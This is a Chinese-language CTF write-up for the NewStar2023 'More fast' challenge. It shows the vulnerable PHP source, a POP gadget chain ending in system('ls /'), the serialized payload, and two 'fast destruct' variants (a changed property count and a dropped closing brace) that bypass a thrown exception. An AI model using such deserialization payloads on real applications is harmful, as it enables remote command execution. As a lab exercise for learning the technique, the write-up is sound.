### NewStar2023-week4----More fast

> Fast destruct

----

```php
<?php
highlight_file(__FILE__);

class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}

class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func;
    public $var;
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}

class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}

class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}

$a = @unserialize($_POST['fast']);
throw new Exception("Nope");
Fatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55
解释
```

上面是题目初始内容，读了一下大概是构造pop链执行

```php
<?php
class Start{
    public $errMsg;

}

class Pwn{
    public $obj;
}

class Reverse{
    public $func;
}

class Web{
    public $func = 'system';
    public $var = 'ls /';
}

class Crypto{
    public $obj;
}

class Misc{
}
$a = new Start();
$a->errMsg = new Crypto();
$a->errMsg->obj = new Reverse();
$a->errMsg->obj->func = new Pwn();
$a->errMsg->obj->func->obj = new Web();
echo serialize($a);

//O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}
```



Payload：

```php
O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}
```

![image-20241104213535002](https://gitee.com/bx33661/image/raw/master/path/image-20241104213535002.png)

发现抛出异常error，是由于题目最后一个语句

```php
throw new Exception("Nope");
```

导致无法执行`__destruct()`



一个知识点：**Fast destruct**

1. 修改元素个数

```php
O:5:"Start":2:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}
```

2. 删除尾部`}`

```php
O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}

O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}
```

